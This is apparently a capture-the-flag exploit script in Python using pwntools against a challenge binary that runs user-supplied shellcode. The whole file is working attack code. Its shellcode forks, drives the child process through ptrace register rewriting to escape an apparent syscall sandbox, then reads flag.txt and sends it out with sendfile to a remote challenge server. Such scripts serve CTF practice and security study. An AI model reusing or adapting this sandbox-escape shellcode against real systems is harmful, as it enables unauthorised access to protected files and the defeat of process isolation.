#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *isolate_and_jump+19
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================


def exploit():
    # https://necessary-psychology-c86.notion.site/canon-event-1a336e79f11a802ab45ed0446a13d7b4?pvs=73
    global io
    io = initialize()

    PTRACE_CONT = 7
    PTRACE_GETREGS = 12
    PTRACE_SETREGS = 13
    PTRACE_SYSCALL = 24
    RIP_OFFSET = 8 * 16

    shellcode = asm(
        shellcraft.fork() +
        """
        test eax, eax
        jz child
        mov r13, rax
        """ +
        shellcraft.wait4("r13") +
        shellcraft.ptrace(PTRACE_SYSCALL, "r13", 0, 0) +
        shellcraft.wait4("r13") +
        shellcraft.ptrace(PTRACE_GETREGS, "r13", 0, "rsp") +
        f"""mov rdi, 0x820000000000
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        """ +
        shellcraft.ptrace(PTRACE_SETREGS, "r13", 0, "rsp") +
        shellcraft.ptrace(PTRACE_CONT, "r13", 0, 0) +
        shellcraft.wait4("r13") +
        shellcraft.ptrace(PTRACE_GETREGS, "r13", 0, "rsp") +
        f"""
        lea rdi, [rip+sendfile]
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        """ +
        shellcraft.ptrace(PTRACE_SETREGS, "r13", 0, "rsp") +
        shellcraft.ptrace(PTRACE_SYSCALL, "r13", 0, 0) +
        shellcraft.wait4("r13") +
        shellcraft.ptrace(PTRACE_GETREGS, "r13", 0, "rsp") +
        f"""
        mov rdi, 0x820000000000
        lea rbx, [rsp+{RIP_OFFSET}]
        mov [rbx], rdi
        """ +
        shellcraft.ptrace(PTRACE_SETREGS, "r13", 0, "rsp") +
        shellcraft.ptrace(PTRACE_CONT, "r13", 0, 0) +
        shellcraft.wait4("r13") +
        f"""
        hlt
        child:
        """ +
        shellcraft.ptrace(0, 0, 0, 0) +
        """
        int3
        """ +
        shellcraft.open("flag.txt", 0, 0) +
        """
        sendfile:
        """ +
        shellcraft.sendfile(1, 3, 0, 0x50)
    )
    io.sendlineafter("code size: ", str(0x1000).encode())
    io.sendlineafter("enter shellcode: ", shellcode)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
